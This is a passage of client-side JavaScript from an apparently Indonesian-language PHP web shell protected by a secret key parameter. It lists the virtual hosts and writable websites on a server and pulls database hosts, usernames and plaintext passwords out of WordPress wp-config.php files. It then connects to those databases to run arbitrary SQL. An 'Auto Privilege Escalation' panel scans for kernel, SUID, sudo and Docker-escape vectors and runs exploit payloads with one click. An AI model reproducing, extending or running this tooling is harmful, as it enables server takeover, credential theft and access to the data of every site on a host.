            document.getElementById('scanStatus').textContent = 'Error: ' + error.message.substring(0, 50) + '...';
        }
    };
} catch (e) {
    // Function already defined
}

function renderVirtualHostResults(vhosts, content, scanData) {
    // Sort by server type then domain
    vhosts.sort((a, b) => {
        if (a.server !== b.server) return a.server.localeCompare(b.server);
        return a.domain.localeCompare(b.domain);
    });
    
    const apacheCount = vhosts.filter(v => v.server === 'Apache').length;
    const nginxCount = vhosts.filter(v => v.server === 'Nginx').length;
    const litespeedCount = vhosts.filter(v => v.server === 'LiteSpeed').length;
    
    // Get distro info from scan data
    const distroText = scanData && scanData.distro === 'debian' ? '📦 Debian/Ubuntu' : 
                      scanData && scanData.distro === 'rhel' ? '🔴 CentOS/RHEL' : '❓ Unknown';
    
    let html = `<div style="background: linear-gradient(135deg, #0f0, #0a0); color: #000; padding: 15px; border-radius: 4px; margin-bottom: 15px; text-align: center;">`;
    html += `<strong style="font-size: 16px;">🌐 ${vhosts.length} VirtualHost Ditemukan!</strong>`;
    html += `<div style="font-size: 11px; margin-top: 5px; color: #333;">Distro: ${distroText}</div>`;
    html += `<div style="font-size: 12px; margin-top: 8px;">`;
    if (apacheCount > 0) html += `<span style="margin-right: 15px;">🔴 Apache: ${apacheCount}</span>`;
    if (nginxCount > 0) html += `<span style="margin-right: 15px;">🟢 Nginx: ${nginxCount}</span>`;
    if (litespeedCount > 0) html += `<span>🟣 LiteSpeed: ${litespeedCount}</span>`;
    html += `</div></div>`;
    
    // Group by server type
    const grouped = {};
    vhosts.forEach(vhost => {
        if (!grouped[vhost.server]) grouped[vhost.server] = [];
        grouped[vhost.server].push(vhost);
    });
    
    // Render each group
    Object.keys(grouped).forEach(serverType => {
        const serverVhosts = grouped[serverType];
        const serverColors = {
            'Apache': '#f80',
            'Nginx': '#0f0',
            'LiteSpeed': '#f0f'
        };
        const serverIcons = {
            'Apache': '🔴',
            'Nginx': '🟢',
            'LiteSpeed': '🟣'
        };
        const serverColor = serverColors[serverType] || '#6cf';
        const serverIcon = serverIcons[serverType] || '⚪';
        
        html += `<div style="margin-bottom: 20px;">`;
        html += `<div style="background: #1a1a1a; padding: 10px 15px; border-left: 4px solid ${serverColor}; margin-bottom: 10px;">`;
        html += `<strong style="color: ${serverColor}; font-size: 14px;">${serverIcon} ${serverType} (${serverVhosts.length})</strong>`;
        html += `</div>`;
        
        serverVhosts.forEach((vhost, index) => {
            const encodedPath = encodeURIComponent(vhost.docroot);
            const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
            const webUrl = 'http://' + vhost.domain;
            const hasDocroot = vhost.docroot && vhost.docroot !== '';
            
            html += `<div style="background: #111; border: 1px solid #333; border-radius: 4px; padding: 12px; margin-bottom: 8px;">`;
            
            // Header with domain and badges
            html += `<div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px;">`;
            html += `<div style="flex: 1;">`;
            html += `<div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">`;
            html += `<span style="color: #6cf; font-weight: bold;">#${index + 1}</span>`;
            html += `<a href="${webUrl}" target="_blank" style="color: #0f0; font-weight: bold; font-size: 14px; text-decoration: none;" title="Buka website di tab baru">`;
            html += `🌐 ${escapeHtml(vhost.domain)}`;
            html += `</a>`;
            html += `<span style="background: ${serverColor}; color: #000; padding: 2px 8px; border-radius: 3px; font-size: 10px; font-weight: bold;">${serverType}</span>`;
            if (vhost.listen) {
                html += `<span style="background: #333; color: #888; padding: 2px 8px; border-radius: 3px; font-size: 10px;">Port: ${vhost.listen}</span>`;
            }
            html += `</div>`;
            html += `</div>`;
            html += `</div>`;
            
            // Document Root
            if (hasDocroot) {
                html += `<div style="margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 3px;">`;
                html += `<div style="font-size: 10px; color: #888; margin-bottom: 4px;">📁 Document Root:</div>`;
                html += `<a href="${shellUrl}" target="_blank" style="color: #6cf; font-family: monospace; font-size: 12px; text-decoration: none; word-break: break-all;" title="Buka folder di shell baru">`;
                html += `➜ ${escapeHtml(vhost.docroot)}`;
                html += `</a>`;
                html += `</div>`;
            } else {
                html += `<div style="margin-top: 8px; padding: 8px; background: #2a0000; border-radius: 3px; color: #f44; font-size: 11px;">`;
                html += `⚠️ Document root tidak ditemukan`;
                html += `</div>`;
            }
            
            // Aliases (for Apache)
            if (vhost.aliases && vhost.aliases.length > 0) {
                html += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
                html += `📎 Aliases: ${vhost.aliases.map(a => '<span style="color: #ff0;">' + escapeHtml(a) + '</span>').join(', ')}`;
                html += `</div>`;
            }
            
            // Quick actions
            html += `<div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">`;
            html += `<a href="${webUrl}" target="_blank" style="background: #0f0; color: #000; padding: 4px 12px; border-radius: 3px; font-size: 11px; text-decoration: none; font-weight: bold;">🌐 Buka Web</a>`;
            if (hasDocroot) {
                html += `<a href="${shellUrl}" target="_blank" style="background: #6cf; color: #000; padding: 4px 12px; border-radius: 3px; font-size: 11px; text-decoration: none; font-weight: bold;">📁 Buka Folder</a>`;
            }
            html += `</div>`;
            
            html += `</div>`;
        });
        
        html += `</div>`;
    });
    
    content.innerHTML = html;
}

function navigateToDir(path) {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(path);
}
function renderFilenameResults(data, content) {
    data.sort((a, b) => {
        if (a.has_title && !b.has_title) return -1;
        if (!a.has_title && b.has_title) return 1;
        return a.path.localeCompare(b.path);
    });
    let html = `<div style="background: #0f0; color: #000; padding: 12px; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 14px;">`;
    html += `<strong>- Ditemukan ${data.length} website!</strong>`;
    html += `<span style="display: block; font-size: 11px; margin-top: 5px; color: #333;">`;
    html += `Dengan title: ${data.filter(s => s.title).length} | `;
    html += `Writable: ${data.filter(s => s.writable).length}`;
    html += `</span>`;
    html += `</div>`;
    data.forEach((site, index) => {
        const hasTitle = site.title ? true : false;
        const priorityClass = hasTitle ? 'priority' : '';
        const titleBadge = hasTitle
            ? '<span class="website-badge badge-title">- TITLE FOUND</span>'
            : '';
        const writableBadge = site.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const typeColor = site.type === 'WordPress' ? '#ff0' :
                         site.type === 'Laravel' ? '#f0f' :
                         site.type === 'Static HTML' ? '#6cf' : '#0f0';
        const encodedPath = encodeURIComponent(site.path);
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
        html += `
            <div class="website-item ${priorityClass}">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
                    <div style="flex: 1;">
                        <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
                            <span style="color: #6cf; font-weight: bold;">#${index + 1}</span>
                            <span style="color: ${typeColor}; font-weight: bold;">${site.type}</span>
                            ${writableBadge}
                            ${titleBadge}
                        </div>
                        ${hasTitle ? `<div class="website-title">' ${escapeHtml(site.title)}</div>` : ''}
                    </div>
                    <a href="${shellUrl}" target="_blank" style="padding: 6px 15px; font-size: 12px; background: #0f0; color: #000; text-decoration: none; border-radius: 4px; font-weight: bold; white-space: nowrap; margin-left: 10px;">- Buka</a>
                </div>
                <div class="website-path">${escapeHtml(site.path)}</div>
                <div class="website-meta">
                    <span>📄 Marker: ${site.marker}</span>
                    <span> ${site.size}</span>
                    <span>${site.writable ? ' Writable' : ' Read-only'}</span>
                </div>
            </div>
        `;
    });
    content.innerHTML = html;
}
function renderContentResults(data, content) {
    let html = `<div style="background: #ff0; color: #000; padding: 12px; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 14px;">`;
    html += `<strong>- Ditemukan ${data.length} file dengan konten cocok!</strong>`;
    html += `<span style="display: block; font-size: 11px; margin-top: 5px; color: #333;">`;
    html += `Writable: ${data.filter(s => s.writable).length} | Total matches: ${data.reduce((acc, s) => acc + s.matches.length, 0)}`;
    html += `</span>`;
    html += `</div>`;
    data.forEach((file, index) => {
        const writableBadge = file.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const encodedPath = encodeURIComponent(file.path);
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(dirname(file.path));
        html += `
            <div class="website-item">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
                    <div style="flex: 1;">
                        <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
                            <span style="color: #6cf; font-weight: bold;">#${index + 1}</span>
                            <span style="color: #ff0; font-weight: bold;">${file.type}</span>
                            ${writableBadge}
                        </div>
                    </div>
                    <div style="display: flex; gap: 5px;">
                        <a href="${shellUrl}" target="_blank" style="padding: 4px 10px; font-size: 11px; background: #0f0; color: #000; text-decoration: none; border-radius: 4px; font-weight: bold;">- Dir</a>
                    </div>
                </div>
                <div class="website-path">${escapeHtml(file.path)}</div>
                <div style="margin-top: 10px;">
                    <p style="color: #6cf; font-size: 11px; margin-bottom: 5px;">🔍 Pattern cocok:</p>
                    ${file.matches.map(m => `
                        <div style="background: #222; padding: 8px; border-radius: 3px; margin: 5px 0; font-size: 11px; border-left: 3px solid #0f0;">
                            <span style="color: #ff0; font-weight: bold;">${escapeHtml(m.pattern)}</span>
                            ${file.preview && m.context ? `
                                <div style="color: #888; margin-top: 5px; font-family: monospace; white-space: pre-wrap; word-break: break-all;">${escapeHtml(m.context)}</div>
                            ` : ''}
                        </div>
                    `).join('')}
                </div>
                <div class="website-meta">
                    <span> ${file.size}</span>
                    <span>${file.writable ? ' Writable' : ' Read-only'}</span>
                </div>
            </div>
        `;
    });
    content.innerHTML = html;
}
function dirname(path) {
    return path.substring(0, path.lastIndexOf('/'));
}
function exploreDatabase() {
    openModal('dbExploreModal');
    const content = document.getElementById('dbExploreContent');
    content.innerHTML = '<p>⏳ Searching for wp-config.php files... This may take a moment.</p>';
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=explore_db')
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
            }
            return response.text();
        })
        .then(text => {
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Invalid JSON response:', text);
                throw new Error('Invalid server response. Check PHP error logs.');
            }
            if (!Array.isArray(data)) {
                throw new Error('Unexpected response format');
            }
            return data;
        })
        .then(data => {
            if (data.length === 0) {
                content.innerHTML = '<p style="color: #f44;">❌ No WordPress configurations found.</p>';
                return;
            }
            let html = `<p style="color: #0f0;">🔍 Found ${data.length} configuration(s):</p>`;
            html += '<div style="max-height: 400px; overflow-y: auto;">';
            data.forEach((config, index) => {
                html += `
                    <div style="border: 1px solid #0f0; margin: 10px 0; padding: 10px; background: #1a1a1a; border-radius: 4px;">
                        <h4 style="margin: 0 0 10px 0; color: #6cf;">- Config #${index + 1}</h4>
                        <p style="font-size: 11px; margin: 3px 0; color: #888;"><strong>File:</strong> ${escapeHtml(config.filepath)}</p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🖥️ Host:</strong> <span style="color: #f0f;">${escapeHtml(config.db_host)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🔌 Port:</strong> <span style="color: #f0f;">${config.db_port}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🗄️ Database</strong> <span style="color: #ff0;">${escapeHtml(config.db_name)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>👤 Username:</strong> <span style="color: #0f0;">${escapeHtml(config.db_user)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🔒 Password:</strong> <span style="color: #f44; background: #300; padding: 2px 5px; border-radius: 3px;">${escapeHtml(config.db_pass)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>📋 Table Prefix:</strong> ${escapeHtml(config.table_prefix)}</p>
                        <div style="margin-top: 10px;">
                            <button onclick="connectFromExplore('${config.db_host}', ${config.db_port}, '${config.db_name}', '${config.db_user}', '${config.db_pass}')">
                                " Connect to this DB
                            </button>
                        </div>
                    </div>
                `;
            });
            html += '</div>';
            content.innerHTML = html;
        })
        .catch(error => {
            console.error('Explore DB Error:', error);
            content.innerHTML = '<div style="color: #f44; padding: 10px; background: #300; border-radius: 4px;">' +
                '<p><strong>❌ Error:</strong> ' + escapeHtml(error.message) + '</p>' +
                '<p style="font-size: 11px; margin-top: 10px;">Possible causes:</p>' +
                '<ul style="font-size: 11px; margin: 5px 0; padding-left: 20px;">' +
                '<li>PHP execution timeout</li>' +
                '<li>Memory limit exceeded</li>' +
                '<li>Permission denied on directories</li>' +
                '<li>Check browser console for details</li>' +
                '</ul></div>';
        });
}
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
function connectFromExplore(host, port, name, user, pass) {
    closeModal('dbExploreModal');
    document.getElementById('dbHost').value = host;
    document.getElementById('dbPort').value = port;
    document.getElementById('dbName').value = name;
    document.getElementById('dbUser').value = user;
    document.getElementById('dbPass').value = pass;
    openModal('dbConnectModal');
}
function testDbConnection() {
    const statusDiv = document.getElementById('dbConnectStatus');
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<p style="color: #888;">⏳ Testing connection...</p>';
    const formData = new FormData(document.getElementById('dbConnectForm'));
    formData.append('action', 'connect_db');
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                statusDiv.innerHTML = '<p style="color: #0f0;">✅ Connection successful!</p>';
            } else {
                statusDiv.innerHTML = '<p style="color: #f44;">❌ Connection failed: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            statusDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function connectToDatabase() {
    const host = document.getElementById('dbHost').value;
    const port = document.getElementById('dbPort').value;
    const name = document.getElementById('dbName').value;
    const user = document.getElementById('dbUser').value;
    const pass = document.getElementById('dbPass').value;
    if (!host || !name || !user) {
        alert('Please fill in Host, Database Name, and Username');
        return;
    }
    currentDbConfig = {
        host: host,
        port: port || 3306,
        name: name,
        user: user,
        pass: pass
    };
    closeModal('dbConnectModal');
    openModal('dbManagerModal');
    const tablesDiv = document.getElementById('dbTablesList');
    tablesDiv.innerHTML = '<p style="color: #888; padding: 10px;">⏳ Loading tables...</p>';
    const formData = new FormData();
    formData.append('action', 'get_tables');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div style="background: #222; padding: 10px; border-radius: 4px; margin-bottom: 10px;">`;
                html += `<div style="color: #0f0; font-size: 11px;">🖥️ MySQL ${escapeHtml(data.server_info)}</div>`;
                html += `<div style="color: #6cf; font-size: 11px; margin-top: 5px;">📊 ${data.tables.length} table(s)</div>`;
                html += `</div>`;
                html += '<ul>';
                data.tables.forEach(table => {
                    html += `<li onclick="viewTableData('${table}')"> ${escapeHtml(table)}</li>`;
                });
                html += '</ul>';
                tablesDiv.innerHTML = html;
            } else {
                tablesDiv.innerHTML = '<p style="color: #f44; padding: 10px;">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            tablesDiv.innerHTML = '<p style="color: #f44; padding: 10px;">❌ Error: ' + error.message + '</p>';
        });
}
function viewTableData(tableName) {
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p style="color: #888;">⏳ Loading table data...</p>';
    const formData = new FormData();
    formData.append('action', 'get_table_data');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('table', tableName);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div style="background: #222; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px;">`;
                html += `<span style="color: #0f0; font-size: 14px;"> <strong>${escapeHtml(tableName)}</strong></span>`;
                html += `<span style="color: #888; margin-left: 20px;">Total: ${data.total_rows} rows</span>`;
                html += `<span style="color: #6cf; margin-left: 20px;">Showing: ${data.data.length}</span>`;
                html += `</div>`;
                if (data.columns.length > 0) {
                    html += '<div style="overflow-x: auto; border: 1px solid #0f0; border-radius: 4px;">';
                    html += '<table style="width: 100%; border-collapse: collapse; font-size: 12px;">';
                    html += '<thead><tr>';
                    data.columns.forEach(col => {
                        html += `<th>${escapeHtml(col)}</th>`;
                    });
                    html += '</tr></thead><tbody>';
                    data.data.forEach((row) => {
                        html += `<tr>`;
                        data.columns.forEach(col => {
                            const val = row[col] !== null ? row[col] : '<span style="color: #666;">NULL</span>';
                            html += `<td title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}">${escapeHtml(String(val))}</td>`;
                        });
                        html += '</tr>';
                    });
                    html += '</tbody></table></div>';
                } else {
                    html += '<p style="color: #888; padding: 20px; text-align: center;">Table is empty</p>';
                }
                document.getElementById('sqlQuery').value = `SELECT * FROM \`${tableName}\` LIMIT 50;`;
                resultDiv.innerHTML = html;
            } else {
                resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function executeSqlQuery() {
    const query = document.getElementById('sqlQuery').value.trim();
    if (!query) {
        alert('Please enter a SQL query');
        return;
    }
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p style="color: #888;">▶️ Executing query...</p>';
    const formData = new FormData();
    formData.append('action', 'execute_sql');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('sql_query', query);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            let html = '';
            html += `<div style="background: #222; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">`;
            html += `<span style="color: #6cf;">⏱️ ${data.execution_time}</span>`;
            if (data.success) {
                if (data.message) {
                    html += `<span style="color: #0f0;">✅ ${escapeHtml(data.message)}</span>`;
                    if (data.affected_rows !== undefined) {
                        html += `<span style="color: #888;">Rows affected: ${data.affected_rows}</span>`;
                    }
                    html += `</div>`;
                } else if (data.data) {
                    html += `<span style="color: #0f0;">✅ ${data.num_rows} rows returned</span>`;
                    html += `</div>`;
                    if (data.columns && data.columns.length > 0) {
                        html += '<div style="overflow-x: auto; border: 1px solid #0f0; border-radius: 4px;">';
                        html += '<table style="width: 100%; border-collapse: collapse; font-size: 12px;">';
                        html += '<thead><tr>';
                        data.columns.forEach(col => {
                            html += `<th>${escapeHtml(col)}</th>`;
                        });
                        html += '</tr></thead><tbody>';
                        data.data.forEach((row) => {
                            html += `<tr>`;
                            data.columns.forEach(col => {
                                const val = row[col] !== null ? row[col] : '<span style="color: #666;">NULL</span>';
                                html += `<td title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}">${escapeHtml(String(val))}</td>`;
                            });
                            html += '</tr>';
                        });
                        html += '</tbody></table></div>';
                    }
                }
            } else {
                html += `<span style="color: #f44;">❌ Error</span></div>`;
                html += `<div style="background: #300; padding: 15px; border-radius: 4px; color: #f88;">`;
                html += `<strong>Error:</strong><br>${escapeHtml(data.error)}`;
                html += `</div>`;
            }
            resultDiv.innerHTML = html;
        })
        .catch(error => {
            resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function clearSqlResult() {
    document.getElementById('sqlResult').innerHTML = '<p style="color: #666;">Execute a query to see results...</p>';
}

// 🔥 Auto Privilege Escalation Functions
let privescScanResults = null;

// Utility: Add log entry (now goes to output)
function addPrivescLog(message, type = 'info') {
    const outputDiv = document.getElementById('privescOutput');
    if (!outputDiv) return;
    outputDiv.style.display = 'block';
    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
    outputDiv.innerHTML += '<span style="color:#666">[' + time + ']</span> <span style="color:' + color + '">' + message + '</span>\n';
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

// Utility: Clear log
function clearPrivescLog() {
    const outputDiv = document.getElementById('privescOutput');
    if (outputDiv) {
        outputDiv.innerHTML = '';
        outputDiv.style.display = 'none';
    }
}

// Utility: Update progress bar
function updatePrivescProgress(current, total) {
    const percent = Math.round((current / total) * 100);
    const statusDiv = document.getElementById('privescStatus');
    if (statusDiv) {
        statusDiv.innerHTML = '<div class="privesc-progress"><div>⏳ Scanning... ' + current + '/' + total + ' (' + percent + '%)</div><div class="privesc-progress-bar"><div class="privesc-progress-fill" style="width:' + percent + '%"></div></div></div>';
    }
}

// Quick scan with compact output
async function scanPrivesc() {
    const resultsDiv = document.getElementById('privescResults');
    const statusDiv = document.getElementById('privescStatus');
    const outputDiv = document.getElementById('privescOutput');
    const vectors = ['kernel', 'suid', 'sudo', 'docker'];
    const vectorNames = { kernel: '🐛 Kernel', suid: '⚡ SUID', sudo: '🔑 SUDO', docker: '🐳 Docker' };
    
    // Reset UI
    resultsDiv.style.display = 'none';
    resultsDiv.innerHTML = '';
    statusDiv.style.display = 'block';
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<div style="color:#6cf">🔍 Starting privilege escalation scan...</div>';
    
    const results = {};
    let foundCount = 0;
    let completedCount = 0;
    const totalVectors = vectors.length;
    
    // Live progress update function
    function updateScanProgress(vectorName, status, found = null) {
        const percent = Math.round((completedCount / totalVectors) * 100);
        const progressBar = '█'.repeat(Math.floor(percent / 10)) + '░'.repeat(10 - Math.floor(percent / 10));
        
        statusDiv.innerHTML = `
            <div style="margin-bottom:5px;">
                <span style="color:#6cf;font-weight:bold;">🔍 SCANNING</span>
                <span style="color:#ff0;float:right;">${percent}%</span>
            </div>
            <div style="background:#111;border:1px solid #333;padding:2px;border-radius:3px;margin-bottom:5px;">
                <div style="background:linear-gradient(90deg,#0f0,#6cf);width:${percent}%;height:8px;border-radius:2px;"></div>
            </div>
            <div style="font-size:10px;color:#888;">${progressBar} ${completedCount}/${totalVectors} vectors</div>
            ${vectorName ? `<div style="font-size:11px;color:${status==='done'?'#0f0':status==='found'?'#ff0':'#888'};margin-top:5px;">${status==='scanning'?'⏳':'✓'} ${vectorName}${found ? ' - ' + found : ''}</div>` : ''}
        `;
    }
    
    updateScanProgress(null, 'starting');
    
    // Scan key vectors only (faster)
    for (const vector of vectors) {
        updateScanProgress(vectorNames[vector], 'scanning');
        
        try {
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
            const data = await response.json();
            completedCount++;
            
            if (data.success && data.data) {
                results[vector] = data.data;
                
                if (vector === 'kernel' && data.data.vulnerable) {
                    const cveCount = data.data.exploits?.length || 0;
                    outputDiv.innerHTML += '<span style="color:#f44">🐛 ' + cveCount + ' kernel CVEs</span>\n';
                    updateScanProgress(vectorNames[vector], 'found', cveCount + ' CVEs');
                    foundCount++;
                } else if (vector === 'suid' && data.data.exploitable && data.data.exploitable.length > 0) {
                    const suidCount = data.data.exploitable.length;
                    outputDiv.innerHTML += '<span style="color:#ff0">⚡ ' + suidCount + ' SUID bins</span>\n';
                    updateScanProgress(vectorNames[vector], 'found', suidCount + ' binaries');
                    foundCount++;
                    document.getElementById('statSuid').textContent = suidCount;
                } else if (vector === 'sudo' && data.data.exploitable && data.data.exploitable.length > 0) {
                    const sudoCount = data.data.exploitable.length;
                    outputDiv.innerHTML += '<span style="color:#0f0">🔑 ' + sudoCount + ' sudo misconfigs</span>\n';
                    updateScanProgress(vectorNames[vector], 'found', sudoCount + ' misconfigs');
                    foundCount++;
                    document.getElementById('statSudo').textContent = 'Yes';
                } else if (vector === 'docker' && data.data.escape_possible) {
                    outputDiv.innerHTML += '<span style="color:#6cf">🐳 Docker escape possible</span>\n';
                    updateScanProgress(vectorNames[vector], 'found', 'escape methods');
                    foundCount++;
                    document.getElementById('statDocker').textContent = 'Yes';
                } else {
                    updateScanProgress(vectorNames[vector], 'done', 'clean');
                }
            } else {
                updateScanProgress(vectorNames[vector], 'done', 'no data');
            }
        } catch (error) {
            completedCount++;
            updateScanProgress(vectorNames[vector], 'done', 'error');
            outputDiv.innerHTML += '<span style="color:#f44">✗ ' + vectorNames[vector] + ' failed</span>\n';
        }
    }
    
    // Final status
    statusDiv.innerHTML = foundCount > 0 
        ? `<div style="color:#0f0;font-weight:bold;">✅ Found ${foundCount} exploitable vectors</div><div style="font-size:10px;color:#888;">Check results below</div>`
        : '<div style="color:#888;">⚠️ No obvious vectors found</div><div style="font-size:10px;color:#666;">Try full scan or manual exploitation</div>';
    statusDiv.style.borderColor = foundCount > 0 ? '#0f0' : '#f44';
    privescScanResults = results;
    displayPrivescResults(results);
    updatePrivescStats(results);
    
    const vulnCount = countVulnerabilities(results);
    if (vulnCount > 0) {
        addPrivescLog('Scan complete! Found ' + vulnCount + ' potential vectors.', 'success');
        statusDiv.className = 'privesc-status success';
        statusDiv.innerHTML = '✅ Scan completed! Found ' + vulnCount + ' potential vectors.';
    } else {
        addPrivescLog('Scan complete. No obvious vectors found.', 'warn');
        statusDiv.className = 'privesc-status';
        statusDiv.innerHTML = '✅ Scan completed. No obvious vectors found.';
    }
}

function displayPrivescResults(results) {
    const resultsDiv = document.getElementById('privescResults');
    let html = '<div style="display:flex;flex-direction:column;gap:6px;">';
    let hasResults = false;
    
    // SUID Binaries - Compact
    if (results.suid && results.suid.exploitable?.length > 0) {
        hasResults = true;
        html += '<div style="border:1px solid #f44;background:#2a0000;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#f44;margin-bottom:3px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
        results.suid.exploitable.slice(0, 3).forEach(bin => {
            html += '<div style="font-size:10px;margin:2px 0;display:flex;justify-content:space-between;align-items:center;">';
            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + bin.binary + '</code>';
            html += '<button onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')" style="background:#f44;color:#fff;border:none;padding:2px 6px;border-radius:3px;font-size:9px;cursor:pointer;">Run</button>';
            html += '</div>';
        });
        html += '</div>';
    }
    
    // Sudo Permissions - Compact
    if (results.sudo && results.sudo.exploitable?.length > 0) {
        hasResults = true;
        html += '<div style="border:1px solid #0f0;background:#001a00;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#0f0;margin-bottom:3px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
        results.sudo.exploitable.slice(0, 2).forEach(sudo => {
            html += '<div style="font-size:10px;margin:2px 0;">';
            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + escapeHtml(sudo.payload.substring(0, 35)) + '...</code>';
            html += '</div>';
        });
        html += '</div>';
    }
    
    // Docker - Compact
    if (results.docker && results.docker.escape_possible) {
        hasResults = true;
        html += '<div style="border:1px solid #6cf;background:#001a2a;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#6cf;">🐳 Docker Escape</div>';
        html += '</div>';
    }
    
    // Kernel - Compact
    if (results.kernel && results.kernel.vulnerable) {
        hasResults = true;
        html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#ff0;">🐛 Kernel: ' + (results.kernel.exploits?.length || 0) + ' CVEs</div>';
        html += '</div>';
    }
    
    html += '</div>';
    
    if (hasResults) {
        resultsDiv.innerHTML = html;
        resultsDiv.style.display = 'block';
    } else {
        resultsDiv.style.display = 'none';
        resultsDiv.innerHTML = '';
    }
}

function updatePrivescStats(results) {
    if (results.kernel) {
        document.getElementById('statKernel').textContent = results.kernel.kernel || 'Unknown';
    }
    if (results.suid) {
        document.getElementById('statSuid').textContent = results.suid.count || 0;
    }
    if (results.sudo) {
        document.getElementById('statSudo').textContent = results.sudo.accessible ? 'Yes' : 'No';
    }
    if (results.docker) {
        document.getElementById('statDocker').textContent = results.docker.in_docker ? 'Yes (Container)' : 'No';
    }
}

function countVulnerabilities(results) {
    let count = 0;
    if (results.kernel && results.kernel.vulnerable) count += results.kernel.exploits.length;
    if (results.suid) count += results.suid.exploitable.length;
    if (results.sudo) count += results.sudo.exploitable.length;
    if (results.docker && results.docker.escape_possible) count += results.docker.methods.length;
    return count;
}

function runPrivescExploit(method, target) {
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '⏳ Executing ' + method + ' exploit...';
    
    const formData = new FormData();
    formData.append('action', 'privesc_exploit');
    formData.append('method', method);
    formData.append('target', target);
    
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                outputDiv.innerHTML = '<span style="color:#0f0;">✅ Exploit executed!</span>\n\n' + escapeHtml(data.output);
                statusDiv.className = 'privesc-status success';
                statusDiv.innerHTML = '✅ Exploit completed! Check output below.';
            } else {
